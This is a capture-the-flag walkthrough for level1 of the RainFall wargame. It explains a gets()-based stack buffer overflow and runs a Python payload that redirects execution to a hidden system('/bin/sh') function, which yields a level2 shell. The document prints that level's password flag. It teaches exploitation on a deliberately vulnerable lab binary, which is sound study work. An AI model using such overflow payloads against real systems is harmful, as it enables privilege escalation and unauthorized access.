# level1

```sh
➜  ~ ssh level1@127.0.0.1 -p 4242
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.0.2.15:4242
level1@127.0.0.1's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
level1@RainFall:~$
```

_The ritual_ :
- `pwd`: `/home/user/level1`
- `id`: `uid=2030(level1) gid=2030(level1) groups=2030(level1),100(users)`
- `ls -la`: 
```sh
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

_run it_

```sh
level1@RainFall:~$ ./level1
^C
level1@RainFall:~$ ./level1 "The One Piece is real"
^C
level1@RainFall:~$
```

- It's an infinite loop, regardless of the arguments given.

## _Decompilation time_

```sh
➜  ~ scp -P 4242 level1@127.0.0.1:/home/user/level1/level1 /Users/mayoub/Desktop/
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.0.2.15:4242
level1@127.0.0.1's password:
level1                                                                                                                                                                    100% 5138   321.5KB/s   00:00
➜  ~
```

![binary_1](Ressources/binary_1.png)

_Okay, simple. Let's see the man of `gets` :_

```txt
SECURITY CONSIDERATIONS
     The gets() function cannot be used securely.  Because of its lack of bounds checking, and the inability
     for the calling program to reliably determine the length of the next incoming line, the use of this
     function enables malicious users to arbitrarily change a running program's functionality through a
     buffer overflow attack.  It is strongly suggested that the fgets() function be used in all cases.  (See
     the FSA.)
```

_"Buffer Overflow attack"... hum..._

- The binary is vulnerable to a **buffer overflow attack**, here's our exploit.
- Before exploit that, let's see the rest of our decompiled code :

![strange_function](Ressources/strange_function.png)

- This function is never called, but it's interesting to see that it's a `system` call with the argument `/bin/sh`. Maybe we can use it to get a shell ?

## Okay, what's a buffer overflow attack ?

- A buffer overflow occurs when a program writes more data to a block of memory, or buffer, than the buffer is allocated to hold. This can corrupt data, crash the program, or give the attacker <u>a way to execute arbitrary code</u>.

- The most common type of buffer overflow is the **stack-based buffer overflow**. In this type of attack, the attacker provides input to a program that is copied to a buffer on the stack. If the attacker provides more data than the buffer can hold, the extra data overwrites other data on the stack, such as the return address of a function.

- The function `gets` is particularly dangerous because it does not perform any bounds checking on the input data. This means that it will continue to write data to the buffer until it encounters a newline character, regardless of the size of the buffer.

- In this case, we can exploit the buffer overflow vulnerability in the `level1` program to overwrite the return address of the `main` function with the address of the `run` function, which will allow us to execute arbitrary code.

## How to exploit it ?

1) We can suppose the buffer we can overflow is the variable `local_50` who has a size of 76 bytes.

2) The function `gets` is used to read input from the user, and it does not perform any bounds checking. This means that we can provide more than 76 bytes of input to overflow the buffer.

3) What the function `run` do ? It calls the `fwrite` function to write the string `Good... Wait what ?` to the standard output, and then it calls the `system` function to execute the command `/bin/sh`.

4) The command `objdump -d level1` displays the disassembled code of the `level1` program, including the addresses of the functions. Here's the output :

```sh
level1@RainFall:~$ objdump -d ./level1

./level1:     file format elf32-i386

# Others functions of the program...
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave
 804847f:	c3                   	ret

08048480 <main>:
 8048480:	55                   	push   %ebp
 8048481:	89 e5                	mov    %esp,%ebp
 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
 8048486:	83 ec 50             	sub    $0x50,%esp
 8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
 804848d:	89 04 24             	mov    %eax,(%esp)
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave
 8048496:	c3                   	ret
 8048497:	90                   	nop
 8048498:	90                   	nop
 8048499:	90                   	nop
 804849a:	90                   	nop
 804849b:	90                   	nop
 804849c:	90                   	nop
 804849d:	90                   	nop
 804849e:	90                   	nop
 804849f:	90                   	nop
# Others functions of the program...

level1@RainFall:~$
```

- We can see the address of the function `run` is `0x8048444`.

5) `local_50` keeps 76 bytes, and the return address is 4 bytes after the end of the buffer. So we need to fill the buffer with 76 bytes, and overwrite the return address with the address of the `run` function.

For more explications, her's a schema :

```txt
Initial stack layout
+----------------------------+
| Return address (main)      | <- Overwritten by the address of `run`
+----------------------------+
| local_50 (76 bytes)        |
+----------------------------+

Stack layout after buffer overflow
+----------------------------+
| Return address (0x08048444)| <- Redirects to `run`
+----------------------------+
| "A" * 76 + \x44\x84\x04\x08|
+----------------------------+
```

6) **Now we know how to exploit the program** : we need to provide 76 bytes of padding followed by the address of the `run` function. Let's do it and construct the payload. For construct the payload we need :
- The address of the `run` function : `0x08048444`
- The padding : `"A" * 76`

7) **Understanding what is `little-endian` and `big-endian`** : In computing, **endianess** is the order or sequence of bytes of a word of digital data in computer memory. Endianness is primarily expressed as **big-endian** (BE) or **little-endian** (LE). A big-endian system stores the most significant byte of a word at the smallest memory address and the least significant byte at the largest. A little-endian system, in contrast, stores the least significant byte at the smallest address.

Exemple : `0x12345678` in big-endian is `12 34 56 78` and in little-endian is `78 56 34 12`.

- Which endianess is used in our system ? We can use the command `lscpu` to know it :

```sh
level1@RainFall:~$ lscpu
Architecture:          i686
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                4
On-line CPU(s) list:   0-3
Thread(s) per core:    1
Core(s) per socket:    4
Socket(s):             1
Vendor ID:             AuthenticAMD
CPU family:            15
Model:                 107
Stepping:              1
CPU MHz:               999.999
BogoMIPS:              1897.33
Virtualization:        AMD-V
L1d cache:             64K
L1i cache:             64K
L2 cache:              512K
L3 cache:              16384K
level1@RainFall:~$
```

- It's a `Little Endian` system.

8) **What is a payload** : A payload is a piece of code that is executed when a vulnerability is exploited. In this case, the payload will be the address of the `run` function followed by the padding and the output is returned to the standard output.

9) **Let's construct the payload** (in Python for my case because... Because I want it, it's my walkthrough, you can use others languages) :

```sh
python -c 'print "A" * 76 + "\x44\x84\x04\x08"'
```

- `python -c` : execute the Python code in the command line.
- `print` : print the output.
- `"A" * 76` : print the character `A` 76 times.
- `+` : concatenate the two strings.
- `"\x44\x84\x04\x08"` : the address of the `run` function in little-endian.
- `| ./level1` : pipe the output to the `level1` program, we add it to execute the payload.

10) **Let's exploit it** :

```sh
level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
[...WAITING FOR THE SHELL...]
```

## OHHH LEZGOOO-

```sh
level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$
```

## NOOOOOOOOOOOOO

- **Why a `Segmentation fault` ?** Because `python -c 'print "A" * 76 + "\x44\x84\x04\x08"'` send as output `AAA...A\x44\x84\x04\x08` to the pipe and close the standard input, then the pipe send the output to the `level1` program, but the `gets` function read the input from the standard input, and the standard input is closed, so the program crashes. It's just a shell issue.

- **How to fix it ?** Use a new command to keep the standard input open after the payload is sent : `cat`. The pipe receive as input FIRSTLY the output of `python -c 'print "A" * 76 + "\x44\x84\x04\x08"'` and SECONDLY the output of `cat`. What is the output of `cat` ? Nothing, it just keep the standard input open and send what he receive as input to the pipe and the pipe send it to the `level1` program. That's it. That's shell. (remember [`minishell`](https://github.com/Nimpoo/minishell))

- Here's the new command : **`(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1`**

```sh
level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
[...NOTHING...]
```

_Okay, no crash..._

```sh
level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
whoami
level2
```

# _LEZGOOOOOOOOOOOOOOOOOOOOOOOO !!!! Let's get the flag ! :_

```sh
level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
^C
Segmentation fault (core dumped)
level1@RainFall:~$
```

(The `Segmentation fault` is normal, the `SIGINT` signal close the standard input, so the program crashes)

- Let's log in to `level2`

```sh
level1@RainFall:~$ su level2
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
level2@RainFall:~$
```

# level1 complet !
![yeah](../assets/yeah.gif)